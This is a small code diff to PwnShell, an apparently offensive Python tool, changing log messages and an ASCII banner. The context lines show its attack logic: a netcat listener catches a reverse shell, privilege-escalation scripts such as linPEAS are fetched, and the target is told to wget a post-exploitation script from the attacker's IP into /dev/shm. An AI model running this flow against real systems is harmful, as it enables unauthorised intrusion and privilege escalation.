@@ -87,10 +87,10 @@ class PwnShell:
         nc = nclib.Netcat(listen=('', self.port))
         print(f"\n[*]Got Connection From -> [{self.ip}:{self.port}]")
         print("[*]Payload :",self.current_payload)
-        print('[*]Uploading Shell Script to [/dev/shm]...')
+        print('[*]Uploading Shell Script To [/dev/shm] On Target Machine...')
         os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
         time.sleep(3)
-        print('[*]Auto Stablizing & Uploading PrivESC Scripts works for [bash/sh] Shells for Now...')
+        print('[*]Auto Stablizing & Uploading PrivESC Scripts -> Works ONLY For [Bash/Sh] Shells For Now <-')
         time.sleep(5)
         nc.send_line(b"export TERM=xterm-256color")
         send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh'''
@@ -218,7 +218,8 @@ def exit_gracefully():
 
 if __name__ == '__main__':
     try:
-        banner = ''' 
+        banner = '''
+            ############################################################## 
                  __    ____                _____ __         ____    __
                _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
               / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
